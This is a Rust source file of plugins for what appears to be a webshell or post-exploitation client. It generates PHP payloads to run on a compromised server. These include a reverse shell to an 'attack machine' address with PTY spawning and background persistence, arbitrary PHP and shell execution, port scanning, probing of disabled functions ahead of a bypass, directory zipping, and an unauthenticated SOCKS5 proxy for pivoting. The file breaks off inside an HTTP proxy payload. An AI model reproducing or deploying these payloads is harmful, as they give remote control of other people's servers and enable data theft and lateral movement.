//! 内置功能插件（通用 + 语言专用）。
//!
//! 通用插件（languages 为空）：能力与语言无关（命令型走协议命令通道，
//! 代码型按语言模板生成载荷）。
//! 语言专用插件（category = "php" 等）：特定语言能力（环境检测 / bypass 等）。

use crate::domain::AppSettings;
use crate::plugin::{FeatureManifest, FeaturePlugin, ParamSpec};
use crate::protocol::{Protocol, ProtocolError, SessionState};

/// 从参数 JSON 取字符串值。
fn param_str(params: &serde_json::Value, name: &str, default: &str) -> String {
    params
        .get(name)
        .and_then(|v| v.as_str())
        .unwrap_or(default)
        .to_string()
}

fn param_int(params: &serde_json::Value, name: &str, default: u32) -> u32 {
    params
        .get(name)
        .and_then(|v| v.as_u64())
        .unwrap_or(default as u64) as u32
}

fn param_bool(params: &serde_json::Value, name: &str, default: bool) -> bool {
    params
        .get(name)
        .and_then(|v| v.as_bool())
        .unwrap_or(default)
}

fn dirname_cmd(path: &str) -> &str {
    path.rsplit_once('/').map(|(d, _)| d).unwrap_or(".")
}

fn basename_cmd(path: &str) -> &str {
    path.rsplit_once('/').map(|(_, b)| b).unwrap_or(path)
}

fn run_command(
    protocol: &dyn Protocol,
    session: &dyn SessionState,
    command: &str,
    settings: &AppSettings,
) -> Result<serde_json::Value, ProtocolError> {
    let output = protocol.execute_command(session, command, settings)?;
    Ok(serde_json::json!({
        "ok": true,
        "command": command,
        "stdout": output.stdout,
    }))
}

/// 按语言返回进程列表命令（通用：多语言命令模板）。
fn process_command(language: &str) -> &'static str {
    match language {
        "aspnet" => "tasklist /FO CSV 2>nul",
        _ => "ps -eo pid,user,pcpu,pmem,cmd --sort=-pcpu 2>/dev/null | head -60 || ps aux 2>/dev/null | head -60",
    }
}

/// 进程详情（通用）。
pub struct ProcessesPlugin;

impl FeaturePlugin for ProcessesPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "processes".into(),
            name: "进程详情".into(),
            version: "1.1.0".into(),
            description: "列出目标进程（PHP 载荷解析为表格；其他语言回退命令输出）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        _params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let code = r#"<?php
error_reporting(0);
$raw = @shell_exec('ps -eo pid,user,pcpu,pmem,rss,cmd --no-headers 2>/dev/null | head -80');
$rows = array();
foreach (explode("
", trim((string)$raw)) as $line) {
    $line = trim($line);
    if ($line === '') continue;
    $parts = preg_split('/\s+/', $line, 6);
    if (count($parts) < 6) continue;
    $rows[] = $parts;
}
echo json_encode(array('ok' => true, 'data' => array(
    'columns' => array('PID', 'USER', '%CPU', '%MEM', 'RSS(KB)', 'COMMAND'),
    'rows' => $rows,
)));
"#;
                let output = protocol.run_code(session, "php", code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => run_command(protocol, session, process_command(other), settings),
        }
    }
}

/// PHP 端口扫描载荷（串行 fsockopen，超时 1s，可扫多端口）。
fn php_port_scan_code(host: &str, ports: &[u32], timeout: u32) -> String {
    let ports_php: Vec<String> = ports.iter().map(|p| p.to_string()).collect();
    format!(
        r#"<?php
set_time_limit(0);
error_reporting(0);
$host = {host_php};
$ports = array({ports_php});
$timeout = {timeout};
$open = array();
foreach ($ports as $p) {{
    $s = @fsockopen($host, $p, $errno, $errstr, $timeout);
    if ($s) {{ $open[] = $p; fclose($s); }}
}}
echo json_encode(array('host' => $host, 'open' => $open, 'scanned' => count($ports)));
"#,
        host_php = serde_json::to_string(host).unwrap_or_else(|_| "\"\"".to_string()),
        ports_php = ports_php.join(","),
        timeout = timeout,
    )
}

/// 端口扫描（通用：PHP 代码型载荷；JSP/ASP 待协议实现后补模板）。
pub struct PortScanPlugin;

impl FeaturePlugin for PortScanPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "port_scan".into(),
            name: "端口扫描".into(),
            version: "1.0.0".into(),
            description: "扫描目标主机开放端口（基于目标语言的 socket 载荷）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "host".into(),
                    label: "目标主机".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("127.0.0.1")),
                    options: None,
                },
                ParamSpec {
                    name: "ports".into(),
                    label: "端口列表".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("21,22,80,443,3306,3389,6379,8080")),
                    options: None,
                },
                ParamSpec {
                    name: "timeout".into(),
                    label: "连接超时（秒）".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(1)),
                    options: None,
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        let language = runtime;
        let host = param_str(params, "host", "127.0.0.1");
        let ports_text = param_str(params, "ports", "21,22,80,443");
        let ports: Vec<u32> = ports_text
            .split(|c: char| c == ',' || c == ' ' || c == '\n')
            .filter(|s| !s.is_empty())
            .filter_map(|s| s.trim().parse::<u32>().ok())
            .take(128)
            .collect();
        if ports.is_empty() {
            return Err(ProtocolError::ParseError("端口列表为空".to_string()));
        }
        let timeout = param_int(params, "timeout", 1).clamp(1, 10);
        match language {
            "php" => {
                let code = php_port_scan_code(&host, &ports, timeout);
                let output = protocol.run_code(session, "php", &code, settings)?;
                let parsed: serde_json::Value = serde_json::from_str(&output)
                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))?;
                Ok(parsed)
            }
            // 非 PHP：命令型 /dev/tcp 扫描（Linux 环境）
            other => {
                let ports: Vec<String> = ports.iter().map(|p| p.to_string()).collect();
                let checks: Vec<String> = ports
                    .iter()
                    .map(|p| {
                        format!(
                            "(echo >/dev/tcp/{host}/{p}) 2>/dev/null && echo '{p} open' || echo '{p} closed'"
                        )
                    })
                    .collect();
                let command = format!("for c in {}; do $c; done", checks.join("; "));
                run_command(protocol, session, &command, settings)
            }
        }
    }
}

/// PHP 环境检测载荷（PHP 专用：disable_functions / open_basedir / 关键能力）。
fn php_env_code() -> &'static str {
    r#"<?php
error_reporting(0);
function probe_fn($name) {
    if (!function_exists($name)) return 'missing';
    if (in_array($name, array_map('trim', explode(',', ini_get('disable_functions'))))) return 'disabled';
    return 'available';
}
$df = ini_get('disable_functions');
$ob = ini_get('open_basedir');
$checks = array();
foreach (array('shell_exec','exec','system','passthru','popen','proc_open','dl','mail','fsockopen','curl_init','file_put_contents','putenv','pcntl_exec') as $f) {
    $checks[$f] = probe_fn($f);
}
echo json_encode(array(
    'php_version' => PHP_VERSION,
    'sapi' => php_sapi_name(),
    'disable_functions' => $df === false ? '' : $df,
    'open_basedir' => $ob === false ? '' : $ob,
    'safe_mode' => ini_get('safe_mode'),
    'upload_tmp_dir' => ini_get('upload_tmp_dir'),
    'functions' => $checks,
    'uname' => @php_uname('a'),
    'cwd' => getcwd(),
));
"#
}

/// PHP 环境检测（PHP 专用）。
pub struct PhpEnvPlugin;

impl FeaturePlugin for PhpEnvPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "php_env".into(),
            name: "PHP 环境检测".into(),
            version: "1.0.0".into(),
            description: "检测 PHP 禁用函数 / open_basedir / 关键能力（bypass 前置评估）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        _params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "PHP 环境检测仅支持 php 运行时（当前 {runtime}）"
            )));
        }
        let output = protocol.run_code(session, "php", php_env_code(), settings)?;
        serde_json::from_str(&output)
            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
    }
}

/// ZIP 压缩（通用：PHP ZipArchive 载荷）。
fn php_zip_code(source: &str, target: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
$src = {source};
$dst = {target};
if (!class_exists('ZipArchive')) {{ echo json_encode(array('ok' => false, 'error' => 'no ZipArchive')); exit; }}
$zip = new ZipArchive();
if ($zip->open($dst, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {{ echo json_encode(array('ok' => false, 'error' => 'open failed')); exit; }}
if (is_dir($src)) {{
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS));
    $count = 0;
    foreach ($it as $f) {{
        $real = $f->getRealPath();
        if ($real === false) continue;
        $rel = substr($real, strlen(rtrim($src, '/\\')) + 1);
        $zip->addFile($real, str_replace('\\', '/', $rel));
        $count++;
    }}
}} elseif (is_file($src)) {{
    $zip->addFile($src, basename($src));
    $count = 1;
}} else {{ $count = 0; }}
$zip->close();
echo json_encode(array('ok' => true, 'target' => $dst, 'entries' => $count));
"#,
        source = serde_json::to_string(source).unwrap_or_else(|_| "\"\"".to_string()),
        target = serde_json::to_string(target).unwrap_or_else(|_| "\"\"".to_string()),
    )
}

/// ZIP 压缩（通用）。
pub struct ZipPlugin;

impl FeaturePlugin for ZipPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "zip".into(),
            name: "ZIP 压缩".into(),
            version: "1.0.0".into(),
            description: "将目标目录/文件打包为 ZIP（PHP ZipArchive 载荷）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "source".into(),
                    label: "源路径".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!(".")),
                    options: None,
                },
                ParamSpec {
                    name: "target".into(),
                    label: "ZIP 输出路径".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("/tmp/backup.zip")),
                    options: None,
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        let language = runtime;
        let source = param_str(params, "source", ".");
        let target = param_str(params, "target", "/tmp/backup.zip");
        match language {
            "php" => {
                let code = php_zip_code(&source, &target);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            // 非 PHP：系统 zip 命令（zip 可用时）
            other => {
                let command = format!(
                    "cd {} && zip -r {} {} 2>&1 || echo 'zip unavailable'",
                    dirname_cmd(&source),
                    &target,
                    basename_cmd(&source),
                );
                run_command(protocol, session, &command, settings)
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plugin::FeaturePluginRegistry;

    #[test]
    fn builtin_manifests_valid() {
        for manifest in FeaturePluginRegistry::builtin().list() {
            assert!(!manifest.id.is_empty());
            assert!(!manifest.name.is_empty());
            assert!(manifest.category == "general" || manifest.category == "php");
        }
    }

    #[test]
    fn port_scan_php_code_generates() {
        let code = php_port_scan_code("127.0.0.1", &[80, 443], 1);
        assert!(code.contains("fsockopen"));
        assert!(code.contains("80"));
        assert!(code.contains("127.0.0.1"));
    }
}

// ---------------------------------------------------------------------------
// WebShell 扫描（通用，PHP 载荷）
// ---------------------------------------------------------------------------

fn php_webshell_scan_code(dir: &str, max_depth: u32) -> String {
    format!(
        r#"<?php
error_reporting(0);
$root = {dir};
$maxDepth = {depth};
$patterns = array(
    'eval\s*\(' => 'eval', 'assert\s*\(\s*\$' => 'assert', 'shell_exec' => 'shell_exec',
    'passthru' => 'passthru', 'system\s*\(' => 'system', 'exec\s*\(' => 'exec',
    'base64_decode\s*\(\s*\$_' => 'b64-input', 'gzinflate' => 'gzinflate',
    'str_rot13' => 'str_rot13', 'create_function' => 'create_function',
    'preg_replace\s*\(\s*["\x27].*?/e' => 'preg-replace-e', 'pack\s*\(\s*["\x27]H' => 'pack-hex',
    '\$_(GET|POST|REQUEST|COOKIE)\[' => 'superglobal-input',
);
$exts = array('php', 'php3', 'php4', 'php5', 'phtml', 'pht', 'jsp', 'jspx', 'aspx', 'asp', 'asa');
$out = array('root' => $root, 'scanned' => 0, 'webshells' => array());
$it = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
    RecursiveIteratorIterator::SELF_FIRST
);
$it->setMaxDepth($maxDepth);
foreach ($it as $f) {{
    if (!$f->isFile()) continue;
    $ext = strtolower(pathinfo($f->getFilename(), PATHINFO_EXTENSION));
    if (!in_array($ext, $exts)) continue;
    $out['scanned']++;
    if ($out['scanned'] > 5000) break;
    $size = $f->getSize();
    if ($size > 2000000) continue;
    $content = @file_get_contents($f->getRealPath());
    if ($content === false) continue;
    $hits = array();
    foreach ($patterns as $re => $label) {{
        if (@preg_match('/' . $re . '/i', $content)) $hits[] = $label;
    }}
    if (count($hits) > 0) {{
        $out['webshells'][] = array(
            'path' => $f->getRealPath(), 'size' => $size,
            'mtime' => $f->getMTime(), 'hits' => $hits,
        );
    }}
}}
echo json_encode($out);
"#,
        dir = serde_json::to_string(dir).unwrap_or_else(|_| "\".\"".to_string()),
        depth = max_depth,
    )
}

/// WebShell 扫描（通用）。
pub struct WebShellScanPlugin;

impl FeaturePlugin for WebShellScanPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "webshell_scan".into(),
            name: "WebShell 扫描".into(),
            version: "1.0.0".into(),
            description: "递归扫描目录，按 eval/assert/编码器特征识别潜在 WebShell（PHP/JSP/ASP）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "dir".into(),
                    label: "扫描目录".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!(".")),
                    options: None,
                },
                ParamSpec {
                    name: "max_depth".into(),
                    label: "最大深度".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(4)),
                    options: None,
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let dir = param_str(params, "dir", ".");
                let depth = param_int(params, "max_depth", 4).clamp(1, 8);
                let code = php_webshell_scan_code(&dir, depth);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "WebShell 扫描暂不支持运行时 {other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 超级终端（通用：批量命令逐条执行）
// ---------------------------------------------------------------------------

fn php_super_terminal_code(commands: &str, cwd: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
$lines = array_filter(array_map('trim', explode("\n", {commands})), 'strlen');
if ({cwd} !== '' && is_dir({cwd})) @chdir({cwd});
$results = array();
foreach ($lines as $cmd) {{
    $o = @shell_exec($cmd . ' 2>&1');
    $results[] = array('cmd' => $cmd, 'output' => (string)$o);
}}
echo json_encode(array('ok' => true, 'cwd' => getcwd(), 'results' => $results));
"#,
        commands = serde_json::to_string(commands).unwrap_or_else(|_| "\"\"".to_string()),
        cwd = serde_json::to_string(cwd).unwrap_or_else(|_| "\"\"".to_string()),
    )
}

/// 超级终端（通用）：一次提交多行命令逐条执行。
pub struct SuperTerminalPlugin;

impl FeaturePlugin for SuperTerminalPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "super_terminal".into(),
            name: "交互式终端（linpty）".into(),
            version: "2.0.0".into(),
            description: "反弹带 PTY 的完全交互式 shell（script 分配伪终端，"
                .to_string()
                .trim_end_matches("。")
                .to_string()
                + "支持 su 用户切换 / vim / top）；本地请用 PTY 方式接收："
                + "socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:'bash',pty,stderr,setsid,sigint,sane",
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "host".into(),
                    label: "攻击机地址".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("127.0.0.1")),
                    options: None,
                },
                ParamSpec {
                    name: "port".into(),
                    label: "攻击机监听端口".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(4444)),
                    options: None,
                },
                ParamSpec {
                    name: "background".into(),
                    label: "后台驻留".into(),
                    param_type: "bool".into(),
                    default: Some(serde_json::json!(true)),
                    options: None,
                },
            ],
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let host = param_str(params, "host", "127.0.0.1");
                let port = param_int(params, "port", 4444).clamp(1, 65535);
                // 交互式 PTY 反弹（linpty）：script 分配 PTY → su 可用
                let background = param_bool(params, "background", true);
                let code = php_reverse_shell_code(&host, port, "/bin/bash", true, background);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "交互式终端暂不支持运行时 {other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 代码执行（PHP 专用：执行任意 PHP 代码）
// ---------------------------------------------------------------------------

fn php_eval_code(code: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
ob_start();
try {{
{code}
}} catch (Exception $e) {{
    echo (string)$e;
}}
$output = ob_get_clean();
echo json_encode(array('ok' => true, 'output' => $output));
"#
    )
}

/// 代码执行（PHP 专用）。
pub struct EvalCodePlugin;

impl FeaturePlugin for EvalCodePlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "p_eval_code".into(),
            name: "代码执行".into(),
            version: "1.0.0".into(),
            description: "在目标 PHP 环境执行任意 PHP 代码（异常捕获，输出 JSON）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![ParamSpec {
                name: "code".into(),
                label: "PHP 代码".into(),
                param_type: "string".into(),
                default: Some(serde_json::json!("echo 'hello';")),
                options: None,
            }],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "代码执行仅支持 php 运行时（当前 {runtime}）"
            )));
        }
        let code = param_str(params, "code", "echo 'hello';");
        let payload = php_eval_code(&code);
        let output = protocol.run_code(session, "php", &payload, settings)?;
        serde_json::from_str(&output)
            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
    }
}

// ---------------------------------------------------------------------------
// 虚拟终端（通用：单条命令 + 工作目录）
// ---------------------------------------------------------------------------

fn php_real_cmd_code(command: &str, cwd: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
$cmd = {command};
$cwd = {cwd};
if ($cwd !== '' && is_dir($cwd)) @chdir($cwd);
$o = @shell_exec($cmd . ' 2>&1');
echo json_encode(array('ok' => true, 'cwd' => getcwd(), 'stdout' => base64_encode((string)$o)));
"#,
        command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
        cwd = serde_json::to_string(cwd).unwrap_or_else(|_| "\"\"".to_string()),
    )
}

/// 虚拟终端（通用）：单条命令执行（可指定工作目录，输出 base64）。
pub struct RealCmdPlugin;

impl FeaturePlugin for RealCmdPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "real_cmd".into(),
            name: "虚拟终端（反弹 Shell）".into(),
            version: "2.0.0".into(),
            description: "反弹一个 /bin/bash 到攻击机（pcntl 可用时后台驻留）；"
                .to_string()
                .trim_end_matches("；")
                .to_string()
                + " 本地监听：nc -lvnp PORT 后执行",
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "host".into(),
                    label: "攻击机地址".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("127.0.0.1")),
                    options: None,
                },
                ParamSpec {
                    name: "port".into(),
                    label: "攻击机监听端口".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(4444)),
                    options: None,
                },
                ParamSpec {
                    name: "shell".into(),
                    label: "Shell".into(),
                    param_type: "select".into(),
                    default: Some(serde_json::json!("/bin/bash")),
                    options: Some(vec!["/bin/bash".into(), "/bin/sh".into()]),
                },
                ParamSpec {
                    name: "background".into(),
                    label: "后台驻留".into(),
                    param_type: "bool".into(),
                    default: Some(serde_json::json!(true)),
                    options: None,
                },
            ],
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let host = param_str(params, "host", "127.0.0.1");
                let port = param_int(params, "port", 4444).clamp(1, 65535);
                let shell = param_str(params, "shell", "/bin/bash");
                let background = param_bool(params, "background", true);
                let code = php_reverse_shell_code(&host, port, &shell, false, background);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "反弹 Shell 暂不支持运行时 {other}"
            ))),
        }
    }
}

/// 反弹 Shell PHP 载荷：fsockopen + proc_open 绑定 socket。
/// `pty_mode` 为 true 时用 script 分配 PTY（支持 su 等交互，linpty）。
fn php_reverse_shell_code(host: &str, port: u32, shell: &str, pty_mode: bool, background: bool) -> String {
    let pty_shell = if pty_mode {
        "script -qec \"/bin/bash\" /dev/null 2>/dev/null || python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null || /bin/bash -i"
    } else {
        shell
    };
    format!(
        r#"<?php
set_time_limit(0);
error_reporting(0);
$host = {host};
$port = {port};
$cmd = '{cmd}';
$pid = 0;
if ({background} && function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid > 0) {{
        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid,
            'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
        exit;
    }}
    if (function_exists('posix_setsid')) @posix_setsid();
}}
$sock = @fsockopen($host, $port, $errno, $errstr, 15);
if (!$sock) {{
    echo json_encode(array('ok' => false, 'error' => 'connect failed: ' . $errstr));
    exit;
}}
$descriptors = array(0 => $sock, 1 => $sock, 2 => $sock);
$process = @proc_open($cmd, $descriptors, $pipes);
if (!is_resource($process)) {{
    fwrite($sock, 'proc_open failed' . chr(10));
    fclose($sock);
    echo json_encode(array('ok' => false, 'error' => 'proc_open failed'));
    exit;
}}
@proc_close($process);
if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground',
    'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
"#,
        host = serde_json::to_string(host).unwrap_or_else(|_| "\"127.0.0.1\"".to_string()),
        port = port,
        cmd = pty_shell.replace("\\", "\\\\").replace("'", "\\'"),
        background = if background { "true" } else { "false" },
    )
}

// ---------------------------------------------------------------------------
// SOCKS5 代理（通用，PHP 载荷：pcntl 后台 / 前台窗口）
// ---------------------------------------------------------------------------

fn php_socks_proxy_code(port: u32, window_secs: u32, action: &str) -> String {
    if action == "stop" {
        return format!(
            r#"<?php
error_reporting(0);
$port = {port};
$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
$stopped = false;
$pid = 0;
if (is_file($pidFile)) {{
    $pid = (int)@file_get_contents($pidFile);
    if ($pid > 1 && function_exists('posix_kill')) {{ @posix_kill($pid, 9); $stopped = true; }}
    @unlink($pidFile);
}}
echo json_encode(array('ok' => true, 'stopped' => $stopped, 'pid' => $pid));
return;
"#,
            port = port,
        );
    }
    format!(
        r#"<?php
set_time_limit(0);
error_reporting(0);
$port = {port};
$window = {window};
$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
$pid = 0;
if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid > 0) {{
        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port));
        return;
    }}
    if (function_exists('posix_setsid')) @posix_setsid();
    @file_put_contents($pidFile, getmypid());
}}
$srv = @stream_socket_server('tcp://0.0.0.0:' . $port, $errno, $errstr, STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
if (!$srv) {{ echo json_encode(array('ok' => false, 'error' => $errstr)); return; }}
$deadline = time() + $window;
while (time() < $deadline) {{
    $conn = @stream_socket_accept($srv, 3);
    if (!$conn) continue;
    $head = fread($conn, 2);
    if (strlen($head) < 2 || ord($head[0]) !== 5) {{ fclose($conn); continue; }}
    $nm = ord($head[1]);
    if ($nm > 0) @fread($conn, $nm);
    @fwrite($conn, chr(5) . chr(0));
    $req = @fread($conn, 4);
    if (strlen($req) < 4 || ord($req[0]) !== 5 || ord($req[1]) !== 1) {{ fclose($conn); continue; }}
    $atype = ord($req[3]);
    if ($atype === 1) {{
        $ip = @inet_ntop(@fread($conn, 4)); $pb = @unpack('n', @fread($conn, 2));
        $host = $ip; $rport = $pb[1];
    }} elseif ($atype === 3) {{
        $len = ord(@fread($conn, 1)); $host = @fread($conn, $len); $pb = @unpack('n', @fread($conn, 2));
        $rport = $pb[1];
    }} else {{ fclose($conn); continue; }}
    $remote = @stream_socket_client('tcp://' . $host . ':' . $rport, $e1, $e2, 8);
    if (!$remote) {{ @fwrite($conn, chr(5) . chr(5) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0)); fclose($conn); continue; }}
    @fwrite($conn, chr(5) . chr(0) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0));
    @stream_set_blocking($conn, false);
    @stream_set_blocking($remote, false);
    $start = time();
    while (time() - $start < 240) {{
        $r = array($conn, $remote); $w = null; $x = null;
        $n = @stream_select($r, $w, $x, 1);
        if ($n === false) break;
        foreach ($r as $sock) {{
            $data = @fread($sock, 8192);
            if ($data === '' && @feof($sock)) break 2;
            if ($data !== '' && $data !== false) {{
                $target = ($sock === $conn) ? $remote : $conn;
                @fwrite($target, $data);
            }}
        }}
    }}
    @fclose($conn);
    @fclose($remote);
}}
if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window));
"#,
        port = port,
        window = window_secs,
    )
}

/// SOCKS5 代理（通用：PHP 载荷，pcntl 可用时后台驻留）。
pub struct SocksProxyPlugin;

impl FeaturePlugin for SocksProxyPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "socks_proxy".into(),
            name: "Socks 代理".into(),
            version: "1.0.0".into(),
            description: "在目标主机启动 SOCKS5 代理（无认证；pcntl 可用时后台驻留）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "port".into(),
                    label: "监听端口".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(1080)),
                    options: None,
                },
                ParamSpec {
                    name: "window".into(),
                    label: "存活窗口（秒）".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(600)),
                    options: None,
                },
                ParamSpec {
                    name: "action".into(),
                    label: "操作".into(),
                    param_type: "select".into(),
                    default: Some(serde_json::json!("start")),
                    options: Some(vec!["start".to_string(), "stop".to_string()]),
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let port = param_int(params, "port", 1080).clamp(1024, 65535);
                let window = param_int(params, "window", 600).clamp(30, 3600);
                let action = param_str(params, "action", "start");
                let code = php_socks_proxy_code(port, window, &action);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "Socks 代理暂不支持运行时 {other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// HTTP 代理（通用，PHP 载荷：绝对 URL 转发 + CONNECT 隧道）
// ---------------------------------------------------------------------------

fn php_http_proxy_code(port: u32, window_secs: u32, action: &str) -> String {
    if action == "stop" {
        return format!(
            r#"<?php
error_reporting(0);
$port = {port};
$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
$stopped = false;
$pid = 0;
if (is_file($pidFile)) {{
    $pid = (int)@file_get_contents($pidFile);
    if ($pid > 1 && function_exists('posix_kill')) {{ @posix_kill($pid, 9); $stopped = true; }}
    @unlink($pidFile);
}}
echo json_encode(array('ok' => true, 'stopped' => $stopped, 'pid' => $pid));
return;
"#,
            port = port,
        );
    }
    format!(
        r#"<?php
set_time_limit(0);
error_reporting(0);
$port = {port};
$window = {window};
$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
$pid = 0;
if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid > 0) {{
        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port));
        return;
    }}
    if (function_exists('posix_setsid')) @posix_setsid();
